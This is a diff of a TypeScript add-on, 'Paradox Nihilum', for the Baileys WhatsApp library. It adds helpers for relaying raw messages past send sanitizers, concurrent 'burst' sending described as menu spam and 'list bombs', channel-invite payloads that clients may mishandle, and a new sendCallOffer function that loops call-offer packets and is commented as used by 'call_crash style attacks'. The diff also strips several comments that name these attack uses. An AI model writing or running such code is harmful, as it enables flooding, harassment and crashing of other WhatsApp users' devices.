@@ -1,21 +1,19 @@
 /**
  * Paradox Nihilum foundation layer for Baileys
  * Opt-in helpers — normal bots (ParadoxGPT) keep stock behavior.
- * Attacks / advanced menus use these for raw relay, burst, SSL, channel invite shapes.
  */
-import type { WASocket } from '../Types'
-import { generateWAMessageFromContent, generateMessageID } from '../Utils'
+import { proto } from '../../WAProto/index.js'
+import { generateMessageIDV2, generateWAMessageFromContent } from '../Utils'
+import type { BinaryNode } from '../WABinary'
 
 export type BurstTask = () => Promise<unknown>
 
 export interface RelayRawOptions {
   messageId?: string
   additionalNodes?: any[]
-  /** skip waiting for server ack when possible */
-  fireAndForget?: boolean
+  additionalAttributes?: Record<string, string>
 }
 
-/** Standard biz + native_flow additional nodes used by interactive menus */
 export function bizInteractiveNodes(flowName = 'mixed'): any[] {
   return [
     {
@@ -32,26 +30,30 @@ export function bizInteractiveNodes(flowName = 'mixed'): any[] {
   ]
 }
 
-/**
- * Relay arbitrary WAMessageContent without going through sendMessage sanitizers.
- * Safe for ParadoxGPT menus and for NIHILUM payloads.
- */
 export async function relayRaw(
-  sock: WASocket,
+  sock: any,
   jid: string,
   content: any,
   opts: RelayRawOptions = {}
 ) {
   const full = generateWAMessageFromContent(jid, content, {})
-  const messageId = opts.messageId || full.key.id || generateMessageID()
+  const messageId = opts.messageId || full.key.id
   await sock.relayMessage(jid, full.message!, {
     messageId,
     additionalNodes: opts.additionalNodes,
+    additionalAttributes: opts.additionalAttributes,
   })
   return { key: { ...full.key, id: messageId }, message: full.message }
 }
 
-/** Run many async sends with concurrency limit (efficient pressure / menu spam) */
+/** Fire-and-forget binary node (uses sock.sendNode) */
+export async function sendNodeRaw(sock: any, node: BinaryNode) {
+  if (typeof sock.sendNode !== 'function') {
+    throw new Error('sendNode not available on socket')
+  }
+  return sock.sendNode(node)
+}
+
 export async function sendBurst(tasks: BurstTask[], concurrency = 8): Promise<void> {
   const queue = tasks.slice()
   const n = Math.min(Math.max(1, concurrency), queue.length || 1)
@@ -63,7 +65,7 @@ export async function sendBurst(tasks: BurstTask[], concurrency = 8): Promise<vo
         try {
           await t()
         } catch {
-          /* swallow per-task */
+          /* per-task */
         }
       }
     })
@@ -81,12 +83,8 @@ export interface SingleSelectSection {
   rows: SingleSelectRow[]
 }
 
-/**
- * Single-select list (SSL) via native flow / list shape.
- * Works for normal bot menus and heavy list bombs.
- */
 export async function sendSingleSelect(
-  sock: WASocket,
+  sock: any,
   jid: string,
   opts: {
     text: string
@@ -97,7 +95,6 @@ export async function sendSingleSelect(
     additionalNodes?: any[]
   }
 ) {
-  // Prefer classic list message (widely rendered)
   try {
     return await sock.sendMessage(jid, {
       text: opts.text,
@@ -107,46 +104,18 @@ export async function sendSingleSelect(
       sections: opts.sections,
     } as any)
   } catch {
-    // Fallback: native flow single-select style buttons
-    const buttons = opts.sections.flatMap((sec, si) =>
-      sec.rows.map((row, ri) => ({
-        name: 'single_select',
-        buttonParamsJson: JSON.stringify({
-          title: sec.title || opts.title || 'Menu',
-          sections: [
-            {
-              title: sec.title,
-              rows: [
-                {
-                  header: row.title,
-                  id: row.rowId,
-                  title: row.title,
-                  description: row.description || '',
-                },
-              ],
-            },
-          ],
-        }),
-      }))
-    )
-    // compact: one single_select with full sections
-    const one = [
-      {
-        name: 'single_select',
-        buttonParamsJson: JSON.stringify({
-          title: opts.title || 'Menu',
-          sections: opts.sections.map((s) => ({
-            title: s.title,
-            rows: s.rows.map((r) => ({
-              header: r.title,
-              id: r.rowId,
-              title: r.title,
-              description: r.description || '',
-            })),
-          })),
-        }),
-      },
-    ]
+    const buttonParamsJson = JSON.stringify({
+      title: opts.title || 'Menu',
+      sections: opts.sections.map((s) => ({
+        title: s.title,
+        rows: s.rows.map((r) => ({
+          header: r.title,
+          id: r.rowId,
+          title: r.title,
+          description: r.description || '',
+        })),
+      })),
+    })
     return relayRaw(
       sock,
       jid,
@@ -155,7 +124,7 @@ export async function sendSingleSelect(
           body: { text: opts.text },
           footer: opts.footer ? { text: opts.footer } : undefined,
           nativeFlowMessage: {
-            buttons: one,
+            buttons: [{ name: 'single_select', buttonParamsJson }],
             messageParamsJson: '{}',
           },
         },
@@ -165,9 +134,8 @@ export async function sendSingleSelect(
   }
 }
 
-/** Quick reply / CTA URL / copy code interactive */
 export async function sendNativeFlow(
-  sock: WASocket,
+  sock: any,
   jid: string,
   opts: {
     body: string
@@ -194,13 +162,8 @@ export async function sendNativeFlow(
   )
 }
 
-/**
- * Channel / newsletter invite-style interactive payload into a chat or group.
- * Research note: clients sometimes mis-handle channel admin / invite CTAs in group
- * context; server may drop invalid invites. This emits the shape — not a guaranteed crash.
- */
 export async function sendChannelInviteButton(
-  sock: WASocket,
+  sock: any,
   jid: string,
   opts: {
     body?: string
@@ -217,24 +180,6 @@ export async function sendChannelInviteButton(
     ? `https://whatsapp.com/channel/${code}`
     : `https://whatsapp.com/channel/${String(opts.newsletterJid).replace('@newsletter', '')}`
 
-  const buttons = [
-    {
-      name: 'cta_url',
-      buttonParamsJson: JSON.stringify({
-        display_text: display,
-        url,
-        merchant_url: url,
-      }),
-    },
-    {
-      name: 'cta_copy',
-      buttonParamsJson: JSON.stringify({
-        display_text: 'Copy',
-        copy_code: code || opts.newsletterJid,
-      }),
-    },
-  ]
-
   return relayRaw(
     sock,
     jid,
@@ -242,7 +187,23 @@ export async function sendChannelInviteButton(
       interactiveMessage: {
         body: { text: opts.body || name },
         nativeFlowMessage: {
-          buttons,
+          buttons: [
+            {
+              name: 'cta_url',
+              buttonParamsJson: JSON.stringify({
+                display_text: display,
+                url,
+                merchant_url: url,
+              }),
+            },
+            {
+              name: 'cta_copy',
+              buttonParamsJson: JSON.stringify({
+                display_text: 'Copy',
+                copy_code: code || opts.newsletterJid,
+              }),
+            },
+          ],
           messageParamsJson: JSON.stringify({
             newsletter_jid: opts.newsletterJid,
             newsletter_name: name,
@@ -264,16 +225,57 @@ export async function sendChannelInviteButton(
   )
 }
 
-/** Attach nihilum helpers onto a live socket (non-destructive) */
-export function attachNihilum(sock: WASocket): WASocket & { nihilum: ReturnType<typeof createNihilumApi> } {
-  const api = createNihilumApi(sock)
-  ;(sock as any).nihilum = api
-  return sock as any
+/**
+ * Call offer IQ burst — used by call_crash style attacks.
+ * Emits offer nodes; acceptance/UI is client-side. Not a VoIP stack.
+ */
+export async function sendCallOffer(
+  sock: any,
+  jid: string,
+  opts: { callId?: string; video?: boolean; count?: number } = {}
+) {
+  const count = opts.count ?? 1
+  const me = sock.user?.id || sock.authState?.creds?.me?.id || ''
+  const results = []
+  for (let i = 0; i < count; i++) {
+    const callId = opts.callId || `${Date.now()}${i}`
+    const node: BinaryNode = {
+      tag: 'call',
+      attrs: {
+        to: jid,
+        from: me,
+        id: sock.generateMessageTag?.() || `${Date.now()}`,
+      },
+      content: [
+        {
+          tag: 'offer',
+          attrs: {
+            'call-id': callId,
+            'call-creator': me,
+          },
+          content: opts.video
+            ? [
+                { tag: 'audio', attrs: { decibel: '0', rate: '8000' }, content: undefined },
+                { tag: 'video', attrs: { decibel: '0', rate: '8000' }, content: undefined },
+              ]
+            : [{ tag: 'audio', attrs: { decibel: '0', rate: '8000' }, content: undefined }],
+        },
+      ],
+    }
+    try {
+      await sendNodeRaw(sock, node)
+      results.push({ ok: true, callId })
+    } catch (e: any) {
+      results.push({ ok: false, callId, error: e?.message })
+    }
+  }
+  return results
 }
 
-function createNihilumApi(sock: WASocket) {
-  return {
+export function attachNihilum(sock: any) {
+  const api = {
     relayRaw: (jid: string, content: any, opts?: RelayRawOptions) => relayRaw(sock, jid, content, opts),
+    sendNodeRaw: (node: BinaryNode) => sendNodeRaw(sock, node),
     sendBurst: (tasks: BurstTask[], concurrency?: number) => sendBurst(tasks, concurrency),
     sendSingleSelect: (jid: string, opts: Parameters<typeof sendSingleSelect>[2]) =>
       sendSingleSelect(sock, jid, opts),
@@ -281,16 +283,22 @@ function createNihilumApi(sock: WASocket) {
       sendNativeFlow(sock, jid, opts),
     sendChannelInviteButton: (jid: string, opts: Parameters<typeof sendChannelInviteButton>[2]) =>
       sendChannelInviteButton(sock, jid, opts),
+    sendCallOffer: (jid: string, opts?: Parameters<typeof sendCallOffer>[2]) =>
+      sendCallOffer(sock, jid, opts),
     bizInteractiveNodes,
   }
+  sock.nihilum = api
+  return sock
 }
 
 export const Nihilum = {
   relayRaw,
+  sendNodeRaw,
   sendBurst,
   sendSingleSelect,
   sendNativeFlow,
   sendChannelInviteButton,
+  sendCallOffer,
   bizInteractiveNodes,
   attachNihilum,
 }
